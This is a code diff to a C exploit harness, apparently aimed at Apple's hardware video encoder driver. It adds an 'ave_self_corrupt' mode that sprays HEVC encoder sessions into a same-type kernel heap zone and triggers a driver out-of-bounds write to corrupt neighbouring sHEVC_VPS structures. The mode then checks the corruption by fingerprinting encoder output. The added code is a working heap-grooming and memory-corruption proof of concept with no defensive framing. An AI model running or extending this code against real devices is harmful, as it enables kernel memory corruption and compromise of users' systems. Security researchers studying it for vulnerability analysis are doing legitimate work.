@@ -86,6 +86,7 @@ static volatile int g_cb_had_fmt = 0;
 static CMFormatDescriptionRef g_saved_fmt = NULL; /* retained fmt desc from last callback */
 static uint8_t g_saved_nal[4096]; /* raw encoded NAL bytes from last callback */
 static size_t g_saved_nal_len = 0;
+static volatile size_t g_last_nal_size = 0; /* total encoded data length from last callback */
 
 static void rlog(const char *fmt, ...) {
     va_list ap;
@@ -140,6 +141,7 @@ static void encode_cb(void *ctx, void *src, OSStatus status,
             size_t copy_len = (bb_len > sizeof(g_saved_nal)) ? sizeof(g_saved_nal) : bb_len;
             CMBlockBufferCopyDataBytes(bb, 0, copy_len, g_saved_nal);
             g_saved_nal_len = copy_len;
+            g_last_nal_size = bb_len;
         }
     }
 }
@@ -7864,6 +7866,203 @@ vps_cd_done:
         free(sentinel_buf);
 
         rlog("\n=== AVE_CHAIN complete ===\n");
+
+    } else if (strcmp(mode, "ave_self_corrupt") == 0) {
+        /*
+         * ave_self_corrupt — Same-driver OOB: spray AVE structs, corrupt sibling
+         *
+         * kalloc_type isolation means only allocations of the SAME type can be
+         * adjacent. The sHEVC_VPS structs from multiple AVE encoder sessions
+         * are the same type, so they share a zone.
+         *
+         * Strategy:
+         * 1. Create N AVE encoder sessions (spray sHEVC_VPS in the typed zone)
+         * 2. Trigger 155+ encodes on a "trigger" session (table 2 OOB)
+         * 3. The OOB writes past the trigger's sHEVC_VPS into the adjacent
+         *    session's sHEVC_VPS, corrupting its VPS/SPS/PPS data
+         * 4. Encode frames on all "target" sessions
+         * 5. Compare output NAL units — corrupted VPS data will produce
+         *    different/invalid NAL headers or parameters, confirming OOB hit
+         *
+         * If a target session's output changes after the trigger, we've confirmed
+         * cross-struct corruption within the same type zone.
+         */
+        int sess_count = (argc > 2) ? atoi(argv[2]) : 16;
+        int trigger_encodes = (argc > 3) ? atoi(argv[3]) : 170;
+        int verify_encodes = (argc > 4) ? atoi(argv[4]) : 5;
+        if (sess_count < 4) sess_count = 4;
+        if (sess_count > 64) sess_count = 64;
+
+        rlog("=== AVE_SELF_CORRUPT: Same-type zone OOB ===\n");
+        rlog("Sessions: %d, trigger_encodes=%d, verify_encodes=%d\n\n",
+            sess_count, trigger_encodes, verify_encodes);
+
+        VTCompressionSessionRef *sessions = calloc(sess_count, sizeof(VTCompressionSessionRef));
+        if (!sessions) { rlog("FAIL: calloc\n"); goto done; }
+
+        /* Phase 1: Create many AVE sessions to spray sHEVC_VPS structs */
+        rlog("--- Phase 1: Create %d AVE encoder sessions ---\n", sess_count);
+        int sess_ok = 0;
+        for (int i = 0; i < sess_count; i++) {
+            CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            OSStatus s = VTCompressionSessionCreate(NULL, 192, 192,
+                (CMVideoCodecType)0x6D757861, es, NULL, NULL, encode_cb, NULL, &sessions[i]);
+            CFRelease(es);
+            if (s == noErr && sessions[i]) {
+                VTSessionSetProperty(sessions[i], kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+                VTSessionSetProperty(sessions[i], CFSTR("EncodesAlpha"), kCFBooleanTrue);
+                int aid = 128;
+                CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &aid);
+                VTSessionSetProperty(sessions[i], CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
+                CFRelease(aidn);
+                s = VTCompressionSessionPrepareToEncodeFrames(sessions[i]);
+                if (s == noErr) sess_ok++;
+                else rlog("  sess[%d] prepare failed: %d\n", i, (int)s);
+            } else {
+                rlog("  sess[%d] create failed: %d\n", i, (int)s);
+                sessions[i] = NULL;
+            }
+        }
+        rlog("Active sessions: %d / %d\n", sess_ok, sess_count);
+
+        /* Phase 2: Encode a "baseline" frame on each target session */
+        rlog("\n--- Phase 2: Baseline encode on all sessions ---\n");
+        typedef struct {
+            int nal_count;
+            size_t total_size;
+            size_t pset_count;
+            size_t pset_bytes;
+            uint8_t first_bytes[32];
+        } nal_fingerprint_t;
+        nal_fingerprint_t *baselines = calloc(sess_count, sizeof(nal_fingerprint_t));
+        for (int i = 0; i < sess_count; i++) {
+            if (!sessions[i]) continue;
+            g_encode_done = 0; g_cb_status = -999;
+            g_last_nal_size = 0;
+            CVPixelBufferRef pb = NULL;
+            CVPixelBufferCreate(NULL, 192, 192, kCVPixelFormatType_32BGRA, NULL, &pb);
+            if (pb) {
+                CVPixelBufferLockBaseAddress(pb, 0);
+                void *b = CVPixelBufferGetBaseAddress(pb);
+                if (b) memset(b, 0x80, CVPixelBufferGetDataSize(pb));
+                CVPixelBufferUnlockBaseAddress(pb, 0);
+                VTCompressionSessionEncodeFrame(sessions[i], pb, CMTimeMake(0, 30),
+                    kCMTimeInvalid, NULL, NULL, NULL);
+                VTCompressionSessionCompleteFrames(sessions[i], kCMTimePositiveInfinity);
+                for (int w = 0; w < 50 && !g_encode_done; w++) usleep(10000);
+                baselines[i].total_size = g_last_nal_size;
+                baselines[i].nal_count = (g_cb_status == noErr) ? 1 : 0;
+                baselines[i].pset_count = g_last_pset_count;
+                baselines[i].pset_bytes = g_last_pset_total_bytes;
+                size_t cplen = g_saved_nal_len < 32 ? g_saved_nal_len : 32;
+                memcpy(baselines[i].first_bytes, (const void *)g_saved_nal, cplen);
+                CVPixelBufferRelease(pb);
+            }
+            if (i < 4 || i == sess_count - 1)
+                rlog("  sess[%d]: status=%d nal_size=%zu psets=%zu/%zu\n",
+                    i, (int)g_cb_status, baselines[i].total_size,
+                    baselines[i].pset_count, baselines[i].pset_bytes);
+        }
+
+        /* Phase 3: Trigger OOB on the FIRST session */
+        rlog("\n--- Phase 3: Trigger %d encodes on sess[0] (OOB write) ---\n", trigger_encodes);
+        if (sessions[0]) {
+            int tok = 0, tfail = 0;
+            for (int e = 0; e < trigger_encodes; e++) {
+                g_encode_done = 0;
+                CVPixelBufferRef pb = NULL;
+                CVPixelBufferCreate(NULL, 192, 192, kCVPixelFormatType_32BGRA, NULL, &pb);
+                if (pb) {
+                    CVPixelBufferLockBaseAddress(pb, 0);
+                    void *b = CVPixelBufferGetBaseAddress(pb);
+                    if (b) memset(b, (uint8_t)(e & 0xFF), CVPixelBufferGetDataSize(pb));
+                    CVPixelBufferUnlockBaseAddress(pb, 0);
+                    OSStatus es = VTCompressionSessionEncodeFrame(sessions[0], pb,
+                        CMTimeMake(e + 1, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                    if (es == noErr) tok++;
+                    else tfail++;
+                    CVPixelBufferRelease(pb);
+                }
+            }
+            VTCompressionSessionCompleteFrames(sessions[0], kCMTimePositiveInfinity);
+            rlog("Trigger session: ok=%d fail=%d (flush done)\n", tok, tfail);
+        }
+
+        /* Phase 4: Encode on all OTHER sessions and check for changes */
+        rlog("\n--- Phase 4: Post-OOB encode on target sessions ---\n");
+        int corrupted_sess = 0;
+        for (int i = 1; i < sess_count; i++) {
+            if (!sessions[i]) continue;
+            for (int v = 0; v < verify_encodes; v++) {
+                g_encode_done = 0; g_cb_status = -999;
+                g_last_nal_size = 0;
+                CVPixelBufferRef pb = NULL;
+                CVPixelBufferCreate(NULL, 192, 192, kCVPixelFormatType_32BGRA, NULL, &pb);
+                if (pb) {
+                    CVPixelBufferLockBaseAddress(pb, 0);
+                    void *b = CVPixelBufferGetBaseAddress(pb);
+                    if (b) memset(b, 0x80, CVPixelBufferGetDataSize(pb));
+                    CVPixelBufferUnlockBaseAddress(pb, 0);
+                    VTCompressionSessionEncodeFrame(sessions[i], pb,
+                        CMTimeMake(v + 1, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                    VTCompressionSessionCompleteFrames(sessions[i], kCMTimePositiveInfinity);
+                    for (int w = 0; w < 50 && !g_encode_done; w++) usleep(10000);
+                    CVPixelBufferRelease(pb);
+                }
+
+                if (g_cb_status != noErr && baselines[i].nal_count > 0) {
+                    rlog("  *** sess[%d] encode %d FAILED (was ok): status=%d ***\n",
+                        i, v, (int)g_cb_status);
+                    corrupted_sess++;
+                    break;
+                }
+                if (g_last_nal_size != baselines[i].total_size && baselines[i].total_size > 0) {
+                    rlog("  *** sess[%d] NAL size changed: %zu -> %zu ***\n",
+                        i, baselines[i].total_size, g_last_nal_size);
+                    corrupted_sess++;
+                    break;
+                }
+                size_t cplen2 = g_saved_nal_len < 32 ? g_saved_nal_len : 32;
+                if (cplen2 > 0 && memcmp(baselines[i].first_bytes, (const void *)g_saved_nal, cplen2) != 0) {
+                    rlog("  *** sess[%d] NAL header bytes changed ***\n", i);
+                    rlog("    baseline: %02x %02x %02x %02x ...\n",
+                        baselines[i].first_bytes[0], baselines[i].first_bytes[1],
+                        baselines[i].first_bytes[2], baselines[i].first_bytes[3]);
+                    rlog("    now:      %02x %02x %02x %02x ...\n",
+                        g_saved_nal[0], g_saved_nal[1], g_saved_nal[2], g_saved_nal[3]);
+                    corrupted_sess++;
+                    break;
+                }
+                if (g_last_pset_count != baselines[i].pset_count ||
+                    g_last_pset_total_bytes != baselines[i].pset_bytes) {
+                    rlog("  *** sess[%d] pset changed: count %zu->%zu bytes %zu->%zu ***\n",
+                        i, baselines[i].pset_count, g_last_pset_count,
+                        baselines[i].pset_bytes, g_last_pset_total_bytes);
+                    corrupted_sess++;
+                    break;
+                }
+            }
+        }
+        rlog("\nResults: %d / %d target sessions showed changes\n",
+            corrupted_sess, sess_ok - 1);
+        if (corrupted_sess > 0)
+            rlog("*** SAME-TYPE ZONE OOB CONFIRMED — sibling sHEVC_VPS corrupted ***\n");
+        else
+            rlog("No observable corruption (OOB may have landed in zone padding)\n");
+
+        /* Cleanup */
+        for (int i = 0; i < sess_count; i++) {
+            if (sessions[i]) {
+                VTCompressionSessionInvalidate(sessions[i]);
+                CFRelease(sessions[i]);
+            }
+        }
+        free(sessions);
+        free(baselines);
+
+        rlog("\n=== AVE_SELF_CORRUPT complete ===\n");
 
     } else if (strcmp(mode, "oob_crash_scan") == 0) {
         /*
